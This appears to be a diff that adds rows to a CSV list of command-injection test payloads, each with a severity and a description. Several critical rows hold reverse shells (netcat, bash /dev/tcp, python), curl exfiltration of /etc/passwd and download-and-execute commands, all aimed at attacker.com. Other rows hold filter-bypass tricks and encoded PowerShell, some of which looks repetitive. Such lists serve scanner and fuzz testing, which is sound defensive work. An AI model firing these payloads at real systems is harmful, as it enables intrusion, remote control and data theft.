+cmdinj-046,CmdInj,Command Injection,medium,Echo with special characters,a71aec286e64,; echo 'injected; ls -la'
+cmdinj-047,CmdInj,Command Injection,high,Nested command with quotes,a0d57fe40234,"; echo ""$(whoami)"""
+cmdinj-048,CmdInj,Command Injection,high,Execute command via awk,306b11a2d24b,"; awk 'BEGIN {system(""id"")}'"
+cmdinj-049,CmdInj,Command Injection,high,Execute command via perl,630db19f080a,; perl -e 'print id'
+cmdinj-050,CmdInj,Command Injection,high,Execute command via python,fdbf38f7f927,"; python -c 'import os; os.system(""id"")'"
+cmdinj-051,CmdInj,Command Injection,high,Execute whoami command,f49b7cb55907,& whoami
+cmdinj-052,CmdInj,Command Injection,high,List directory contents,d70b2c413b59,| dir
+cmdinj-053,CmdInj,Command Injection,high,Display network config,71dd74741e85,&& ipconfig
+cmdinj-054,CmdInj,Command Injection,high,List users,75fddf25f914,|| net user
+cmdinj-055,CmdInj,Command Injection,high,List running processes,cf8a4bce998c,; Get-Process
+cmdinj-057,CmdInj,Command Injection,high,List directory contents,c11e80b7c7a3,$(Get-ChildItem)
+cmdinj-058,CmdInj,Command Injection,medium,Launch notepad,0061bba3d9d7,; Start-Process notepad.exe
+cmdinj-059,CmdInj,Command Injection,medium,Write to file,eb561b86db7a,& echo injected > C:\Windows\Temp\injected.txt
+cmdinj-060,CmdInj,Command Injection,critical,Reverse shell,0b6e60d42906,& nc attacker.com 4444 -e cmd.exe
+cmdinj-062,CmdInj,Command Injection,high,Execute id,f1125ace3b36,| id
+cmdinj-063,CmdInj,Command Injection,high,System info,6af27c9bd533,&& uname -a
+cmdinj-069,CmdInj,Command Injection,high,Encoded PowerShell command,9b9ca04120ea,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=
+cmdinj-070,CmdInj,Command Injection,medium,Loop command,8152eac4676d,"& for /L %i in (1,1,5) do @echo %i"
+cmdinj-071,CmdInj,Command Injection,high,Execute command,51c92419e714,; Invoke-Expression 'whoami'
+cmdinj-072,CmdInj,Command Injection,medium,Print environment variables,f00322c1842f,; env
+cmdinj-073,CmdInj,Command Injection,critical,Read passwd file,eae687bfdc7b,; cat /etc/passwd
+cmdinj-074,CmdInj,Command Injection,medium,Query registry,b1e053ed520f,& reg query HKLM\Software
+cmdinj-075,CmdInj,Command Injection,high,Read hosts file,2aa54be1cdb7,; Get-Content C:\Windows\System32\drivers\etc\hosts
+cmdinj-076,CmdInj,Command Injection,medium,Kernel messages,657ae5eab438,; dmesg
+cmdinj-077,CmdInj,Command Injection,medium,Network connections,aec9bd9f59ed,; netstat -an
+cmdinj-078,CmdInj,Command Injection,medium,List running tasks,13c9d34037ba,& tasklist
+cmdinj-079,CmdInj,Command Injection,medium,List services,b2a8b4654612,; Get-Service
+cmdinj-080,CmdInj,Command Injection,medium,List processes,a59f22319d69,; ps aux
+cmdinj-081,CmdInj,Command Injection,medium,Echo and filter output,d3fefbccdf30,& echo injected | findstr injected
+cmdinj-082,CmdInj,Command Injection,medium,Launch process hidden,3bc4a061c6a5,; Start-Process notepad.exe -WindowStyle Hidden
+cmdinj-083,CmdInj,Command Injection,critical,Exfiltrate data via curl,c7f5ff9d079d,; curl http://attacker.com/?data=$(cat /etc/passwd)
+cmdinj-084,CmdInj,Command Injection,high,Encoded PowerShell payload,8c95c6e9c474,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA
+cmdinj-085,CmdInj,Command Injection,critical,Reverse shell via netcat,48b251e88420,; nc attacker.com 4444 -e /bin/bash
+cmdinj-086,CmdInj,Command Injection,critical,Download and execute file,50a2485b3e86,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe
+cmdinj-087,CmdInj,Command Injection,critical,Reverse shell via bash,f110826db702,; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+cmdinj-088,CmdInj,Command Injection,critical,Download and execute PowerShell script,7cbc0454d2c2,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1
+cmdinj-089,CmdInj,Command Injection,critical,Reverse shell via python,b78f75a23d45,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'"
+cmdinj-090,CmdInj,Command Injection,critical,Encoded PowerShell reverse shell,26308b1bcfa3,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==
+cmdinj-091,CmdInj,Command Injection,high,Bypass simple filters using ${IFS} (space) variable,9bb881b77709,; e${IFS}cho injected
+cmdinj-093,CmdInj,Command Injection,high,Double URL encoded semicolon and id,113cc530473c,%253B%2520id
+cmdinj-094,CmdInj,Command Injection,high,Use variable to execute command,f649e1f35f6b,; VAR=whoami; $VAR
+cmdinj-095,CmdInj,Command Injection,critical,Decode and execute base64 payload,04767991e893,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+cmdinj-096,CmdInj,Command Injection,high,Use newline as command separator,dd10bf6ed0a4,"&& echo injected
+id"
+cmdinj-097,CmdInj,Command Injection,critical,Obfuscated PowerShell encoded command,cdaac6c94300,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA
+cmdinj-098,CmdInj,Command Injection,high,Nested command substitution with quotes,a3880cf6fb97,"; echo $(echo ""$(whoami)"")"
+cmdinj-099,CmdInj,Command Injection,high,Indirect command execution via env var,f90ecb687fae,; export CMD=whoami; ${CMD}
